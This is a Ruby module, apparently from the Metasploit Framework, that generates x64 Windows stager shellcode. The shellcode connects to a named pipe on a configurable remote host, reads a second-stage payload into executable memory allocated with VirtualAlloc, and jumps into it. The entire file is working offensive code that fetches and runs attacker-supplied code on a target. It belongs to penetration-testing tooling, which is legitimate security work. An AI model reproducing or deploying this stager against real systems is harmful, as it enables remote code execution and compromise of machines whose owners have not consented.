# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# Complex reverse_named_pipe payload generation for Windows ARCH_X86_64
# ###

module Payload::Windows::ReverseNamedPipe_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID_x64
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Register reverse_named_pipe specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      name:        datastore['PIPENAME'],
      host:        datastore['PIPEHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_named_pipe(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_named_pipe(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned 
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp               ; block API pointer
      #{asm_reverse_named_pipe(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  def transport_config(opts={})
    transport_config_reverse_named_pipe(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'seh' is the worst case, that adds 15 bytes
    space += 15

    # Reliability adds bytes!
    space += 57

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_named_pipe(opts={})

    #reliable       = opts[:reliable]
    reliable       = false
    retry_count    = [opts[:retry_count].to_i, 1].max
    full_pipe_name = "\\\\\\\\#{opts[:host]}\\\\pipe\\\\#{opts[:name]}"

    asm = %Q^
      ; Input: RBP must be the address of 'api_call'
      ; Output: RDI will be the handle to the named pipe.

      retry_start:
        push #{retry_count}     ; retry counter
        pop r14

        ; Func(rcx, rdx, r8, r9, stack ...)
      try_reverse_named_pipe:
        call get_pipe_name
        db "#{full_pipe_name}", 0x00
      get_pipe_name:
        pop rcx                 ; lpFileName
      ; Start by setting up the call to CreateFile
        push 0                  ; alignment
        push 0                  ; hTemplateFile
        push 0                  ; dwFlagsAndAttributes
        push 3                  ; dwCreationDisposition (OPEN_EXISTING)
        xor r9, r9              ; lpSecurityAttributes
        xor r8, r8              ; dwShareMode
        mov rdx, 0xC0000000     ; dwDesiredAccess(GENERIC_READ|GENERIC_WRITE)
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
        call rbp                ; CreateFileA(...)

      ; check for failure
        cmp rax, -1             ; did it work?
        jnz connected

      handle_connect_failure:
        dec r14                 ; decrement the retry count
        jnz retry_start
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0         ; hardcoded to exitprocess for size
        call rbp
      ^
    end

    asm << %Q^
      ; this  lable is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
        xchg rdi, rax           ; Save the file handler for later
    ^
    asm << asm_write_uuid if include_send_uuid

    asm << %Q^
      ; Receive the size of the incoming second stage...
        push 0                  ; buffer for lpNumberOfBytesRead
        mov r9, rsp             ; lpNumberOfBytesRead
        push 0                  ; buffer for lpBuffer
        mov rsi, rsp            ; lpNumberOfBytesRead
        push 4                  ; sizeof(DWORD)
        pop r8                  ; nNumberOfBytesToRead
        push 0                  ; alignment
        push 0                  ; lpOverlapped
        mov rdx, rsi            ; lpBuffer
        mov rcx, rdi            ; hFile
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call rbp                ; ReadFile(...)
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the received worked, and reconnect
      ; if it fails
        test eax, eax
        jz cleanup_file
        mov rax, [rsi+8]
        test eax, eax
        jz cleanup_file
      ^
    end

    asm << %Q^
      
      ; Alloc a RWX buffer for the second stage
        add rsp, 0x30           ; slight stack adjustment
        pop rsi                 ; pop off the second stage length
        pop rax                 ; line the stack up again
        mov esi, esi            ; only use the lower-order 32 bits for the size
        push 0x40               ; 
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; 
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx, rcx            ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        mov rbx, rax            ; rbx = our new memory address for the new stage
        mov r15, rax            ; save the address so we can jump into it later

      read_more:
        ; prepare the size min(0x10000, esi)
        mov r8, 0x10000         ; stupid named pipe buffer limit
        cmp r8, rsi
        jle size_is_good
        mov r8, rsi

      size_is_good:
        ; Invoke a read
        push 0                  ; buffer for lpNumberOfBytesRead
        mov r9, rsp             ; lpNumberOfBytesRead
        mov rdx, rbx            ; lpBuffer
        push 0                  ; lpOverlapped
        mov rcx, rdi            ; hFile
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call rbp                ; ReadFile(...)
        add rsp, 0x28           ; slight stack adjustment
    ^

    if reliable
      asm << %Q^
      ; reliability: check to see if the read worked
      ; if it fails
        test eax, eax
        jnz read_successful

      ; something failed so free up memory
        pop rax
        push r15
        pop rcx                 ; lpAddress
        push 0x4000             ; MEM_DECOMMIT
        pop r8                  ; dwFreeType
        push 0                  ; 0
        pop rdx                 ; dwSize
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call rbp                ; VirtualFree(payload, 0, MEM_DECOMMIT)

      cleanup_file:
      ; clean up the socket
        push rdi                ; file handle
        pop rcx                 ; hFile
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
        call rbp

      ; and try again
        dec r14                 ; decrement the retry count
        jmp retry_start
      ^
    end

    asm << %Q^
      read_successful:
        pop rax
        add rbx, rax            ; buffer += bytes_received
        sub rsi, rax            ; length -= bytes_received
        test rsi, rsi           ; test length
        jnz read_more           ; continue if we have more to read
        jmp r15                 ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
